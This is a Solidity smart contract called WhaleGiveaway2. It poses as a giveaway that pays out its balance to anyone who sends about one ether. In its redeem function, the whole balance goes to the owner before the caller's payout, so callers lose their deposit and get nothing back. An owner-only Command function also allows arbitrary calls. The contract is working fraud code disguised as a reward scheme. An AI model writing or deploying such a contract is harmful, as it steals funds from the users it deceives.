pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility);
        Owner.transfer(this.balance);
        msg.sender.transfer(this.balance);
    }

    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        require(adr.call.value(msg.value)(data));
    }
}